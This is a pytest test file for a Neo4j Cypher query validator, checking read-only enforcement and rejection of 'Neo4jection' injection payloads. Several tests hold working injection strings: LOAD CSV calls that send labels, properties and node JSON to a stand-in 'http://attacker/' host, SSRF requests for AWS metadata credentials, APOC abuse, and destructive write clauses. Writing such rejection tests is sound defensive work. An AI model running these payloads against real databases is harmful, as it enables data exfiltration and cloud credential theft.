import pytest

from reporting.services.query_validator import validate_query
from reporting.services.query_validator import ValidationResult


def _mock_cyver(mocker, syntax_ok=True, schema_ok=True, props_ok=True,
                syntax_meta=None, schema_meta=None, props_meta=None):
    mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value.validate.return_value = (
        syntax_ok,
        syntax_meta if syntax_meta is not None else [],
    )
    mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value.validate.return_value = (
        schema_ok,
        schema_meta if schema_meta is not None else [],
    )
    mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value.validate.return_value = (
        props_ok,
        props_meta if props_meta is not None else [],
    )
    mocker.patch("reporting.services.query_validator._get_neo4j_client")


# --- validate_query returns ValidationResult ---


def test_validate_query_success(mocker):
    _mock_cyver(mocker)
    result = validate_query("MATCH (n) RETURN n")
    assert isinstance(result, ValidationResult)
    assert not result.has_errors
    assert result.errors == []
    assert result.warnings == []


def test_validate_query_syntax_error_is_error(mocker):
    _mock_cyver(
        mocker,
        syntax_ok=False,
        syntax_meta=[{"code": "SyntaxError", "description": "Syntax error at position 5"}],
    )
    result = validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert len(result.errors) == 1
    assert result.warnings == []


def test_validate_query_syntax_error_stops_further_validation(mocker):
    """When syntax fails, schema and property validators are not called."""
    syntax_mock = mocker.patch(
        "reporting.services.query_validator.SyntaxValidator"
    ).return_value
    syntax_mock.validate.return_value = (
        False,
        [{"code": "SyntaxError", "description": "bad syntax"}],
    )
    schema_mock = mocker.patch(
        "reporting.services.query_validator.SchemaValidator"
    ).return_value
    props_mock = mocker.patch(
        "reporting.services.query_validator.PropertiesValidator"
    ).return_value
    mocker.patch("reporting.services.query_validator._get_neo4j_client")

    validate_query("MATC (n) RETURN n")

    schema_mock.validate.assert_not_called()
    props_mock.validate.assert_not_called()


def test_validate_query_write_is_error(mocker):
    _mock_cyver(mocker)
    result = validate_query("CREATE (n:Person {name: 'Alice'}) RETURN n")
    assert result.has_errors
    assert any("Write" in str(e) for e in result.errors)
    assert result.warnings == []


def test_validate_query_schema_issue_is_warning(mocker):
    _mock_cyver(
        mocker,
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
    )
    result = validate_query("MATCH (n:Foo) RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Unknown label" in str(result.warnings[0])


def test_validate_query_properties_issue_is_warning(mocker):
    _mock_cyver(
        mocker,
        props_ok=False,
        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
    )
    result = validate_query("MATCH (n) WHERE n.bar = 1 RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 1
    assert "Unknown property" in str(result.warnings[0])


def test_validate_query_multiple_warnings(mocker):
    _mock_cyver(
        mocker,
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label: Foo"}],
        props_ok=False,
        props_meta=[{"code": "PropertiesError", "description": "Unknown property: bar"}],
    )
    result = validate_query("MATCH (n:Foo) WHERE n.bar = 1 RETURN n")
    assert not result.has_errors
    assert len(result.warnings) == 2


def test_validate_query_errors_and_warnings_independent(mocker):
    """Syntax error short-circuits; schema/property warnings are never added."""
    _mock_cyver(
        mocker,
        syntax_ok=False,
        syntax_meta=[{"code": "SyntaxError", "description": "bad"}],
        schema_ok=False,
        schema_meta=[{"code": "SchemaError", "description": "Unknown label"}],
    )
    result = validate_query("MATC (n) RETURN n")
    assert result.has_errors
    assert result.warnings == []


# --- Read-only enforcement (cypher-guard) ---


def test_check_read_only_allows_match(mocker):
    _mock_cyver(mocker)
    result = validate_query("MATCH (n) RETURN n")
    assert not result.has_errors


def test_check_read_only_allows_optional_match(mocker):
    _mock_cyver(mocker)
    result = validate_query("OPTIONAL MATCH (n)-[r]->(m) RETURN n, r, m")
    assert not result.has_errors


def test_check_read_only_allows_match_with_where(mocker):
    _mock_cyver(mocker)
    result = validate_query("MATCH (n) WHERE n.name = 'x' RETURN n")
    assert not result.has_errors


def test_check_read_only_rejects_unsupported_clauses(mocker):
    """cypher-guard rejects queries with clauses it doesn't support (e.g. LIMIT),
    which is the safe behavior for a whitelist approach."""
    _mock_cyver(mocker)
    result = validate_query("MATCH (n) RETURN n LIMIT 10")
    assert result.has_errors


def test_check_read_only_allows_unwind(mocker):
    _mock_cyver(mocker)
    result = validate_query("UNWIND [1, 2, 3] AS x RETURN x")
    assert not result.has_errors


def test_check_read_only_rejects_create(mocker):
    _mock_cyver(mocker)
    result = validate_query("CREATE (n:Person {name: 'Alice'})")
    assert result.has_errors


def test_check_read_only_rejects_merge(mocker):
    _mock_cyver(mocker)
    result = validate_query("MERGE (n:Person {name: 'Alice'}) RETURN n")
    assert result.has_errors


def test_check_read_only_rejects_delete(mocker):
    _mock_cyver(mocker)
    result = validate_query("MATCH (n) DELETE n")
    assert result.has_errors


def test_check_read_only_rejects_set(mocker):
    _mock_cyver(mocker)
    result = validate_query("MATCH (n) SET n.name = 'Bob' RETURN n")
    assert result.has_errors


# --- Neo4jection attack vector tests (from Varonis research) ---
# Reference: https://www.varonis.com/blog/neo4jection-secrets-data-and-cloud-exploits


class TestNeo4jectionStringInjection:
    """Injection payloads that attempt to break out of string comparisons."""

    def test_or_true_with_clause_breakout(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "' OR 1=1 WITH 0 as _l00 CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    def test_property_filter_breakout(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "'=' LOAD CSV FROM 'http://attacker/' as l "
            "WITH 0 as _l00 RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionUnionInjection:
    """UNION-based injection to append attacker-controlled queries."""

    def test_node_property_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "'}) RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    def test_label_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "a) RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors

    def test_relationship_union_breakout(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "'}]-() RETURN 1 UNION MATCH (n) "
            "LOAD CSV FROM 'http://attacker/' as l RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionDataExfiltration:
    """LOAD CSV-based data exfiltration attacks."""

    def test_label_enumeration_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "'}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            "LOAD CSV FROM 'http://attacker/?l='+label as l RETURN 0 as _0"
        )
        assert result.has_errors

    def test_property_extraction_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "' OR 1=1 WITH 1 as a MATCH (f:Flag) UNWIND keys(f) as p "
            "LOAD CSV FROM 'http://attacker/?'+p+'='+toString(f[p]) as l "
            "RETURN 0 as _0 //"
        )
        assert result.has_errors

    def test_json_exfiltration_via_load_csv(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "' OR 1=1 WITH 0 as _0 MATCH (n) "
            "LOAD CSV FROM 'http://attacker/?json='+apoc.convert.toJson(n) as l "
            "RETURN 0 as _0 //"
        )
        assert result.has_errors

    def test_load_csv_standalone(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "LOAD CSV FROM 'http://attacker/data' AS row RETURN row"
        )
        assert result.has_errors


class TestNeo4jectionAPOCExploits:
    """Attacks using APOC procedures for system access."""

    def test_systemdb_graph_exfiltration(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "' OR 1=1 WITH 1 as a CALL apoc.systemdb.graph() yield nodes "
            "LOAD CSV FROM 'http://attacker/?nodes='+apoc.convert.toJson(nodes) "
            "as l RETURN 1 //"
        )
        assert result.has_errors

    def test_procedure_enumeration_neo4j4(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "' OR 1=1 WITH 1 as _l00 CALL dbms.procedures() yield name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )
        assert result.has_errors

    def test_apoc_cypher_run_bypass(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "' OR 1=1 WITH apoc.cypher.runFirstColumnMany("
            '"SHOW FUNCTIONS YIELD name RETURN name",{}) as names '
            "UNWIND names AS name "
            "LOAD CSV FROM 'http://attacker/'+name as _l RETURN 1 //"
        )
        assert result.has_errors


class TestNeo4jectionCloudMetadata:
    """Cloud metadata SSRF attacks via LOAD CSV / APOC."""

    def test_aws_imdsv1_credential_theft(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/' "
            "AS roles UNWIND roles AS role "
            "LOAD CSV FROM "
            "'http://169.254.169.254/latest/meta-data/iam/security-credentials/'"
            "+role as l RETURN l"
        )
        assert result.has_errors

    def test_aws_imdsv2_token_via_apoc(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "CALL apoc.load.csvParams("
            '"http://169.254.169.254/latest/api/token", '
            '{method: "PUT",`X-aws-ec2-metadata-token-ttl-seconds`:21600},'
            '"",{header:FALSE}) yield list '
            "WITH list[0] as token RETURN token"
        )
        assert result.has_errors


class TestNeo4jectionUnicodeBypass:
    """Unicode escape sequences used to evade quote filtering."""

    def test_unicode_quote_escape(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "\u0027}) RETURN 0 as _0 UNION CALL db.labels() yield label "
            'LOAD CSV FROM "http://attacker/"+label RETURN 0 as _o //'
        )
        assert result.has_errors


class TestNeo4jectionWriteClauses:
    """Direct write clause injection attempts."""

    def test_create_node_injection(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "MATCH (n) RETURN n UNION CREATE (evil:Backdoor {cmd: 'whoami'})"
        )
        assert result.has_errors

    def test_merge_with_on_create(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "MERGE (n:Admin {name: 'attacker'}) "
            "ON CREATE SET n.role = 'superadmin' RETURN n"
        )
        assert result.has_errors

    def test_detach_delete_all(self, mocker):
        _mock_cyver(mocker)
        result = validate_query("MATCH (n) DETACH DELETE n")
        assert result.has_errors

    def test_foreach_write(self, mocker):
        _mock_cyver(mocker)
        result = validate_query(
            "MATCH (n) WITH collect(n) as nodes "
            "FOREACH (x IN nodes | SET x.pwned = true)"
        )
        assert result.has_errors

    def test_remove_labels(self, mocker):
        _mock_cyver(mocker)
        result = validate_query("MATCH (n:Admin) REMOVE n:Admin RETURN n")
        assert result.has_errors
